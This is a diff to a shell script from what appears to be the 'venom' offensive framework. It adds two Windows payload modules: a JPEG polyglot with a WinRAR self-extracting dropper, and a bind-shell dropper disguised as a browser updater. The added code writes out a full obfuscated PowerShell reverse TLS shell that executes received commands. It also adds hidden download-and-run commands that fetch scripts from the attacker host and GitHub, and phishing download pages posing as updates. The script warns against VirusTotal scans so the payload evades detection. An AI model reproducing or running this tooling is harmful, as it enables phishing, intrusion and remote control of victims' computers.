@@ -12412,6 +12412,24 @@ cat << !
     AGENT EXTENSION    : PS1
     AGENT PERSISTENCE  : NOT AVAILABLE
 
+    AGENT Nº8
+    ─────────
+    DESCRIPTION        : JPEG Polyglot RCE (OpenSSL)
+    TARGET SYSTEMS     : Windows (8|8.1|9|10)
+    LOLBin             : Invoke-WebRequest
+    DROPPER EXTENSION  : EXE (sfx)
+    AGENT EXTENSION    : PS1
+    AGENT PERSISTENCE  : NOT AVAILABLE
+
+    AGENT Nº9
+    ─────────
+    DESCRIPTION        : Shepard Bind tcp shell
+    TARGET SYSTEMS     : Windows (8|8.1|9|10)
+    LOLBin             : Invoke-WebRequest
+    DROPPER EXTENSION  : EXE (ps1-To-Exe)
+    AGENT EXTENSION    : EXE
+    AGENT PERSISTENCE  : NOT AVAILABLE
+
     ╔═════════════════════════════════════════════════════════════╗
     ║   M    - Return to main menu                                ║
     ║   E    - Exit venom Framework                               ║
@@ -12430,6 +12448,8 @@ case $choice in
 5) sh_evasion5 ;;
 6) vbsevasion="ON";sh_shellcode27 ;;
 7) sh_evasion7 ;;
+8) sh_evasion8 ;;
+9) sh_evasion9 ;;
 "help 1") easter1 ;;
 "help 2") easter2 ;;
 "help 3") easter3 ;;
@@ -12437,6 +12457,8 @@ case $choice in
 "help 5") easter5 ;;
 "help 6") easter6 ;;
 "help 7") easter7 ;;
+"help 8") easter8 ;;
+"help 9") easter9 ;;
 m|M) sh_menu ;;
 e|E) sh_exit ;;
 *) echo ${RedF}[x] "[$choice]"${white}: is not a valid Option${Reset}; sleep 2; clear; sh_ninja ;;
@@ -12554,6 +12576,46 @@ cat << !
     OBFUSCATION: If active (ON) dropper.hta script will be created insted of the obfuscated
                  Batch dropper.bat (default). The dropper.hta will fake the install of Netflix
                  from play.google.com/store before executing our Agent in RAM (FileLess).
+
+!
+echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
+read odf
+clear
+sh_ninja
+}
+easter8 () {
+cat << !
+
+    AGENT Nº   : 8
+    OBFUSCATION: $obfstat <= (settings file)
+    DESCRIPTION: JPEG Polyglot RCE (OpenSSL)
+    DESCRIPTION: This module ask's attacker to input a legit image.jpeg to
+                 be embbebed with our reverse tcp shell (client.ps1), then
+                 it compresses image.jpeg and add's a cmdline to winrar (sfx)
+                 to silent download redpill.ps1 post-exploit auxiliary and to
+                 silent download\execute our client in target RAM.
+    WIKI       : https://gist.github.com/r00t-3xp10it/b94c67b75858705ba34cdbc8047899d9#gistcomment-3784466
+    DEPENDENCIE: python3, powerglot.py, winrar (wine)
+
+!
+echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
+read odf
+clear
+sh_ninja
+}
+easter9 () {
+cat << !
+
+    AGENT Nº   : 9
+    OBFUSCATION: $obfstat <= (settings file)
+    DESCRIPTION: Shepard Bind tcp shell
+    DESCRIPTION: This module uses Social Engineering to trick target user into beliving he is
+                 installing a MicrosoftEdge update while in background downloads the Bind shell
+                 and redpill.ps1 post-exploitation auxiliary module then adds a firewall rule
+                 to prevent client execution TCP connection warnings. And finally executes the
+                 the Bind TCP shell in background. ( The Client beacons home every 30 seconds )
+    WIKI       : https://gist.github.com/r00t-3xp10it/cdc678c49256d34dda3ab4e5a1b00fe9#gistcomment-3772235
+    DEPENDENCIE: python3, Zip
 
 !
 echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
@@ -14096,6 +14158,375 @@ rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 sh_menu
 }
 
+
+# -------------------------------------------------
+#    - WinRar sfx JPEG RCE ( powerglot ) -
+# Reverse TCP Powershell Shell (openSSL - FileLess)
+# -------------------------------------------------
+sh_evasion8 () {
+Colors;
+
+
+## Make sure all module dependencies are satisfied.
+# OpenSSL (to build Server/Client SSL certificates)
+audit=$(which openssl) > /dev/null 2>&1
+if [ "$?" -ne "0" ]; then
+   echo "${RedBg}[ERROR] none openssl installation found.${white}";sleep 2
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing openssl."
+   echo "" && sudo apt-get update && apt-get install -y openssl && echo "" && clear
+fi
+## Make sure python depedencies are installed
+audit=$(python3 --version) > /dev/null 2>&1
+if [ "$?" -ne "0" ]; then
+   echo "${RedBg}[ERROR] none python3 installation found.${white}";sleep 2
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing python3.6"
+   echo "" && sudo apt-get update && apt-get install python3.6 && echo "" && clear
+fi
+audit=$(python3 -c "import numpy;print(numpy.version.version)") > /dev/null 2>&1
+if [ -z "$audit" ]; then
+   echo "${RedBg}[ERROR] python3 numpy installation missing.${white}";sleep 2
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing numpy."
+   echo "" && python3 -m pip install numpy && echo "" && clear
+fi
+WINE_WinRAR=$(cat $IPATH/settings | egrep -m 1 "WinRAR_DRIVEC" | cut -d '=' -f2) > /dev/null 2>&1 # stored WinRAR full path
+if ! [ -e "$WINE_WinRAR" ]; then
+   echo "${RedBg}[ERROR] $WINE_WinRAR missing.${white}";sleep 2
+   echo "${BlueF}[${YellowF}i${BlueF}]${YellowF} Config WinRAR path in: $IPATH/settings.${white}"
+   echo "${BlueF}[${YellowF}i${BlueF}]${YellowF} Install WinRAR.exe before using this module!"${Reset};
+   sleep 3 && sh_ninja
+fi
+
+
+## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
+echo "---"
+echo "${white}- ${RedBg}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
+echo "- Please Dont test samples on Virus Total or on similar"${Reset};
+echo "- online scanners, because that will shorten the payload life."${Reset};
+echo "- And in testings also remmenber to stop the windows defender"${Reset};
+echo "- from sending samples to \$Microsoft.. (just in case)."${Reset};
+echo "---"
+sleep 1
+
+
+## Store User Inputs (bash variable declarations)..
+lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 443" --entry --width 300) > /dev/null 2>&1
+Drop=$(zenity --title="☠ Enter DROPPER NAME (sfx) ☠" --text "example: Netflix\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
+CN=$(zenity --title="☠ Enter OpenSSL CN (domain name) ☠" --text "example: SSARedTeam.com\nWarning: CN must be a valid Domain Name." --entry --width 300) > /dev/null 2>&1
+
+
+## Setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$Drop" ]; then Drop="Netflix";fi
+if [ -z "$CN" ]; then CN="SSARedTeam.com";fi
+
+
+## Display final settings to user.
+echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};sleep 1
+echo ${BlueF}"---"
+cat << !
+    LPORT    : $lport
+    LHOST    : $lhost
+    LOLBin   : Invoke-WebRequest
+    CNDOMAIN : $CN
+    AGENT    : $IPATH/output/Client.ps1
+    DROPPER  : $IPATH/output/$Drop.exe
+    UPLOADTO : %tmp%
+!
+echo "---"
+sleep 1
+
+
+cd $IPATH/output
+troll=$(echo "$lhost"|sed 's/\./£/g'|sed 's/1/@/g')
+echo "${BlueF}[☠]${white} Writting OpenSSL reverse shell to output."${Reset};sleep 2
+echo "<#" > $IPATH/output/Client.ps1
+echo ".SYNOPSIS" >> $IPATH/output/Client.ps1
+echo "   Author: @r00t-3xp10it" >> $IPATH/output/Client.ps1
+echo "   Microsoft Teams Client - UFCD 10526" >> $IPATH/output/Client.ps1
+echo "#>" >> $IPATH/output/Client.ps1
+echo "" >> $IPATH/output/Client.ps1
+echo "\$SSL1AuthKey = \"$troll\"" >> $IPATH/output/Client.ps1
+echo "\$AuthSSLtls12 = \"Net.So\"+\"ckets.Tc\"+\"pClient\" -Join ''" >> $IPATH/output/Client.ps1
+echo "\$CertificateX = \$SSL1AuthKey.Replace(\"£\",\".\").Replace(\"@\",\"1\")" >> $IPATH/output/Client.ps1
+echo "" >> $IPATH/output/Client.ps1
+echo "\$socket = New-Object \$AuthSSLtls12(\$CertificateX, $lport)" >> $IPATH/output/Client.ps1
+echo "\$stream = \$socket.GetStream()" >> $IPATH/output/Client.ps1
+echo "\$sslStream = New-Object System.Net.Security.SslStream(\$stream,\$false,({\$True} -as [Net.Security.RemoteCertificateValidationCallback]))" >> $IPATH/output/Client.ps1
+echo "\$sslStream.AuthenticateAsClient('$CN', \$null, \"Tls12\", \$false)" >> $IPATH/output/Client.ps1
+echo "        \$writer = New-Object System.IO.StreamWriter(\$sslStream)" >> $IPATH/output/Client.ps1
+echo "        \$writer.Write('[' + (hostname) + '] ' + (pwd).Path + '> ')" >> $IPATH/output/Client.ps1
+echo "        \$writer.flush();[byte[]]\$bytes = 0..65535|%{0}" >> $IPATH/output/Client.ps1
+echo "" >> $IPATH/output/Client.ps1
+echo "while((\$iO = \$sslStream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){" >> $IPATH/output/Client.ps1
+echo "   \$viriato = (New-Object -TypeName System.Text.AsciiEncoding).GetString(\$bytes,0, \$iO)" >> $IPATH/output/Client.ps1
+echo "   \$sendData = (iex \$viriato | Out-String ) 2>&1" >> $IPATH/output/Client.ps1
+echo "   \$myPrompt = \$sendData + '[' + (hostname) + '] ' + (pwd).Path + '> '" >> $IPATH/output/Client.ps1
+echo "   \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$myPrompt)" >> $IPATH/output/Client.ps1
+echo "   \$sslStream.Write(\$sendbyte,0,\$sendbyte.Length)" >> $IPATH/output/Client.ps1
+echo "   \$sslStream.Flush()" >> $IPATH/output/Client.ps1
+echo "}" >> $IPATH/output/Client.ps1
+
+
+## Generate SSL certificates (openssl)
+# Delete old certs to prevent future errors.
+rm $IPATH/output/cert.pem > /dev/nul 2>&1
+rm $IPATH/output/key.pem > /dev/nul 2>&1
+echo "${BlueF}[☠]${white} Building SSL certificates (openssl)"${Reset};sleep 2
+
+
+## Ramdomly chose the openssl settings (to make diferent SHA)
+conv=$(cat /dev/urandom | tr -dc '1-3' | fold -w 1 | head -n 1)
+if [ "$conv" = "1" ]; then
+   days="245";contry="US";localidade="Boston";LTDR="Michigan"
+elif [ "$conv" = "2" ]; then
+   days="365";contry="PT";localidade="Lisbon";LTDR="Estremadura"
+else 
+   days="180";contry="FR";localidade="Paris";LTDR="Champs Elysee"
+fi
+
+gnome-terminal --title="Building SSL certificates" --geometry=90x21 --wait -- sh -c "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days $days -nodes -subj \"/C=$contry/ST=$LTDR/L=$localidade/O=Global Security/OU=IT Department/CN=$CN\"" > /dev/null 2>&1
+if [ -e cert.pem ]; then
+   echo "${BlueF}[☠]${white} venom/output/key.pem + cert.pem ([${GreenF}OK${white}])${white} ..";sleep 2
+else
+   echo "${BlueF}[☠]${white} venom/output/key.pem + cert.pem ([${RedF}FAIL${white}])${white} ..";sleep 2
+fi
+cd $IPATH
+
+
+## BUILD DROPPER (to download/execute our agent.ps1).
+echo "${BlueF}[☠]${white} Building WinRar (sfx) binary dropper ..${white}";sleep 2
+ArCh=$(cat $IPATH/settings | egrep -m 1 "SYSTEM_ARCH" | cut -d '=' -f2) > /dev/null 2>&1 # sellected arch to use in Trojanizer.sh
+Image_path=$(zenity --title "☠ LEGIT IMAGE JPG (jpeg) ☠" --filename=$IPATH --file-selection --text "chose one legit image.jpeg") > /dev/null 2>&1
+
+
+cd $IPATH/bin/powerglot
+## use powerglot to embbebed payload into image.jpeg
+sudo echo "powershell -WindowStyle Hidden iwr -Uri \"http://$lhost/Client.ps1\" -OutFile \"\$Env:TMP\\\Client.ps1\";powershell -WindowStyle Hidden -File \$Env:TMP\\\Client.ps1" > MyMeterpreter.ps1
+echo "${BlueF}[☠]${white} powerglot: embbebig client into Image!"${Reset};sleep 2
+python3 powerglot.py -o MyMeterpreter.ps1 $Image_path $Drop.jpeg
+mkdir work;cp $Drop.jpeg $IPATH/bin/powerglot/work/$Drop.jpeg
+
+
+
+#
+# build SFX configuration file (bin/xsf.conf)
+#
+RandomMe="powershell -WindowStyle Hidden cat $Drop.jpeg|powershell" ## yousef bug report!
+mypill="powershell -WindowStyle Hidden iwr -Uri \"http://raw.githubusercontent.com/r00t-3xp10it/redpill/main/redpill.ps1\" -OutFile \"\$Env:TMP\\\redpill.ps1\""
+echo "; The sfx archive title" > $IPATH/bin/powerglot/xsf.conf
+echo "Title=$Drop.jpeg auto-extracter" >> $IPATH/bin/powerglot/xsf.conf
+echo "; The path to the setup executables" >> $IPATH/bin/powerglot/xsf.conf
+echo "Setup=$RandomMe" >> $IPATH/bin/powerglot/xsf.conf
+echo "Setup=$mypill" >> $IPATH/bin/powerglot/xsf.conf
+echo "; Use semi-silent mode" >> $IPATH/bin/powerglot/xsf.conf
+echo "Silent=1" >> $IPATH/bin/powerglot/xsf.conf
+echo "; Overwrite any existing files" >> $IPATH/bin/powerglot/xsf.conf
+echo "Overwrite=1" >> $IPATH/bin/powerglot/xsf.conf
+echo ${BlueF}[☆]${white}" Build SFX configuration file: ${GreenF}done!"${Reset};
+sleep 2
+
+
+cd $IPATH/bin/powerglot/work
+## Using winrar to build sfx archive
+echo "${BlueF}[☠]${white} Running winrar to build sfx archive!"${Reset};sleep 2
+$arch "$WINE_WinRAR" a -c -z$IPATH/bin/powerglot/xsf.conf -r- -ed -s -sfx -y $Drop > /dev/null 2>&1
+mv $IPATH/bin/powerglot/work/$Drop.exe $IPATH/output/$Drop.exe
+
+
+cd $IPATH/output/
+zip $Drop.zip $Drop.exe > /dev/nul 2>&1 ## Zip archive
+## Building the Download Webpage Sellected.
+echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2)"${Reset};sleep 2
+phish=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Download Pages:" --radiolist --column "Pick" --column "Option" TRUE "Mega-Upload (default)" FALSE "Cumulative Security Update" --width 350 --height 200) > /dev/null 2>&1
+if [ "$phish" = "Mega-Upload (default)" ]; then
+    cd $IPATH/templates/phishing
+   sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > MegaUpload.html
+   mv MegaUpload.html $ApAcHe/MegaUpload.html > /dev/nul 2>&1
+else
+   cd $IPATH/templates/phishing/firefox
+   sed "s|NaM3|http://$lhost/$Drop.zip|g" FakeUpdate.html > Download.html
+   mv Download.html $ApAcHe/Download.html > /dev/nul 2>&1
+   cp -r FakeUpdate_files $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
+fi
+
+
+cd $IPATH/output
+## Copy ALL files to apache2 webroot
+echo "${BlueF}[☠]${white} Porting ALL required files to apache2"${Reset};sleep 2
+cp $IPATH/output/Client.ps1 $ApAcHe/Client.ps1 > /dev/nul 2>&1
+cp $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1
+cd $IPATH
+
+
+cd $IPATH/output
+## Print attack vector on terminal
+echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver";sleep 2
+echo "${BlueF}---"
+echo "${BlueF}- ${RedBg}SEND THE URL GENERATED TO TARGET HOST${Reset}"
+if [ "$phish" = "Mega-Upload (default)" ]; then
+   echo "${BlueF}- ${YellowF}ATTACK VECTOR:${BlueF} http://$lhost/MegaUpload.html"
+else
+   echo "${BlueF}- ${YellowF}ATTACK VECTOR:${BlueF} http://$lhost/Download.html"
+fi
+echo "${BlueF}- CmdLine(s) & Scripts: https://rb.gy/68ow4q"
+echo "${BlueF}---"${Reset};
+echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
+read odf
+## START NETCAT HANDLER ON SELLECTED PORT NUMBER
+#x term -T " OPENSSL LISTENER => $lhost:$lport" -geometry 110x23 -e "echo Domain-Name : $CN;echo Certficates : key.pem + cert.pem;echo Listening on: $lhost:$lport;echo ;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport"
+gnome-terminal --title="JPEG POLYGLOT RCE LISTENER => $lhost:$lport" --geometry=90x21 --wait -- sh -c "echo Domain-Name : $CN;echo Certficates : key.pem + cert.pem;echo Listening on: $lhost:$lport;echo ShellOptions: powershell -file redpill.ps1 -help parameters;echo ;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport" > /dev/null 2>&1
+
+
+## Clean old files.
+echo "${BlueF}[☠]${white} Please Wait, cleaning old files ..${white}";sleep 2
+sudo rm $IPATH/output/Client.ps1 > /dev/nul 2>&1
+sudo rm $IPATH/output/cert.pem > /dev/nul 2>&1
+sudo rm $IPATH/output/key.pem > /dev/nul 2>&1
+sudo rm $IPATH/output/$Drop.exe > /dev/nul 2>&1
+sudo rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
+sudo rm $IPATH/output/.ps1 > /dev/nul 2>&1
+sudo rm $IPATH/bin/powerglot/$Drop.jpeg > /dev/nul 2>&1
+sudo rm $IPATH/bin/powerglot/MyMeterpreter.ps1 > /dev/nul 2>&1
+sudo rm $IPATH/bin/powerglot/xsf.conf > /dev/nul 2>&1
+sudo rm $ApAcHe/Client.ps1 > /dev/nul 2>&1
+sudo rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
+sudo rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
+sudo rm $ApAcHe/Download.html > /dev/nul 2>&1
+sudo rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
+sudo rm -r $IPATH/bin/powerglot/work > /dev/nul 2>&1
+cd $IPATH
+
+sh_menu
+}
+
+
+
+
+# -------------------------------------------------
+#         - Shepard bind tcp shell -
+# -------------------------------------------------
+sh_evasion9 () {
+Colors;
+
+
+## Make sure all module dependencies are satisfied.
+# Make sure python depedencies are installed
+audit=$(python3 --version) > /dev/null 2>&1
+if [ "$?" -ne "0" ]; then
+   echo "${RedBg}[ERROR] python3 installation not found.${white}";sleep 2
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing python3.6"
+   echo "" && sudo apt-get update && apt-get install python3.6 && echo "" && clear
+fi
+
+
+
+## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
+echo "---"
+echo "${white}- ${RedBg}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
+echo "- Please Dont test samples on Virus Total or on similar"${Reset};
+echo "- online scanners, because that will shorten the payload life."${Reset};
+echo "- And in testings also remmenber to stop the windows defender"${Reset};
+echo "- from sending samples to \$Microsoft.. (just in case)."${Reset};
+echo "---"
+sleep 1
+
+
+## Store User Inputs (bash variable declarations)..
+rhost=$(zenity --title="☠ Enter RHOST (target ip) ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+dropper=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nRemark: shepbind_serv ( raw client ) does not\ndownload redpill.ps1 or add a firewall exception rule." --radiolist --column "Pick" --column "Option" TRUE "MEdgeUpdaterService" FALSE "FirefoxUpdaterService" FALSE "ChromeUpdaterService" FALSE "shepbind_serv" --width 360 --height 260) > /dev/null 2>&1
+
+## Setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$rhost" ]; then rhost="$IP";fi
+if [ -z "$dropper" ]; then dropper="MEdgeUpdaterService";fi
+
+
+## Display final settings to user.
+echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};sleep 1
+echo ${BlueF}"---"
+cat << !
+    RPORT    : 6006
+    RHOST    : $rhost
+    LOLBin   : Invoke-WebRequest
+    AGENT    : $IPATH/output/shepbind_serv.exe
+    DROPPER  : $IPATH/output/$dropper.exe
+    UPLOADTO : %tmp%
+!
+echo "---"
+sleep 1
+
+
+cd $IPATH/output
+mkdir work
+echo "${BlueF}[☠]${white} Writting bind shell to output."${Reset};sleep 2
+cp $IPATH/bin/shepard/shepardsbind_recv.py $IPATH/output/shepardsbind_recv.py > /dev/null 2>&1 ## server - output
+cp $IPATH/bin/shepard/$dropper.exe $IPATH/output/$dropper.exe > /dev/null 2>&1                 ## dropper - output
+cd $IPATH/output/work
+echo "${BlueF}[☠]${white} Zipping $dropper.exe (Zip)"${Reset};sleep 2
+cp $IPATH/bin/shepard/$dropper.exe $IPATH/output/work/$dropper.exe > /dev/null 2>&1 ## Zip archive           
+zip $dropper.zip $dropper.exe > /dev/nul 2>&1 ## Zip archive
+mv $dropper.zip $IPATH/output/$dropper.zip > /dev/null 2>&1 ## Zip archive - output
+rm -r $IPATH/output/work/ > /dev/null 2>&1
+
+
+cd $IPATH/output
+## Building the Download Webpage Sellected.
+echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2)"${Reset};sleep 2
+phish=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Download Pages:" --radiolist --column "Pick" --column "Option" TRUE "Mega-Upload (default)" FALSE "Cumulative Security Update" --width 350 --height 200) > /dev/null 2>&1
+if [ "$phish" = "Mega-Upload (default)" ]; then
+    cd $IPATH/templates/phishing
+   sed "s|NaM3|http://$lhost/$dropper.zip|g" mega.html > MegaUpload.html
+   mv MegaUpload.html $ApAcHe/MegaUpload.html > /dev/nul 2>&1
+else
+   cd $IPATH/templates/phishing/firefox
+   sed "s|NaM3|http://$lhost/$dropper.zip|g" FakeUpdate.html > Download.html
+   mv Download.html $ApAcHe/Download.html > /dev/nul 2>&1
+   cp -r FakeUpdate_files $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
+fi
+
+
+cd $IPATH/output
+## Copy ALL files to apache2 webroot
+echo "${BlueF}[☠]${white} Porting ALL required files to apache2"${Reset};sleep 2
+cp $IPATH/output/$dropper.zip $ApAcHe/$dropper.zip > /dev/nul 2>&1
+
+
+## Print attack vector on terminal
+echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver";sleep 2
+echo "${BlueF}---"
+echo "${BlueF}- ${RedBg}SEND THE URL GENERATED TO TARGET HOST${Reset}"
+if [ "$phish" = "Mega-Upload (default)" ]; then
+   echo "${BlueF}- ${YellowF}ATTACK VECTOR:${BlueF} http://$lhost/MegaUpload.html"
+else
+   echo "${BlueF}- ${YellowF}ATTACK VECTOR:${BlueF} http://$lhost/Download.html"
+fi
+echo "${BlueF}- CmdLine(s) & Scripts: https://rb.gy/68ow4q"
+echo "${BlueF}---"${Reset};
+echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
+read odf
+
+
+cd $IPATH/output
+## START SHEPARD HANDLER ON SELLECTED PORT NUMBER
+gnome-terminal --title="SHEPARD BIND SHELL HANDLER" --geometry=90x21 --wait -- sh -c "echo waiting for conections ..;sudo python3 shepardsbind_recv.py $rhost" > /dev/null 2>&1
+
+
+## Clean old files.
+echo "${BlueF}[☠]${white} Please Wait, cleaning old files ..${white}";sleep 2
+sudo rm $IPATH/output/shepardsbind_recv.py > /dev/nul 2>&1
+sudo rm $IPATH/output/$dropper.exe > /dev/nul 2>&1
+sudo rm $IPATH/output/$dropper.zip > /dev/nul 2>&1
+sudo rm $IPATH/output/.ps1 > /dev/nul 2>&1
+sudo rm $ApAcHe/$dropper.zip > /dev/nul 2>&1
+sudo rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
+sudo rm $ApAcHe/Download.html > /dev/nul 2>&1
+sudo rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
+cd $IPATH
+
+sh_menu
+}
 
 
 
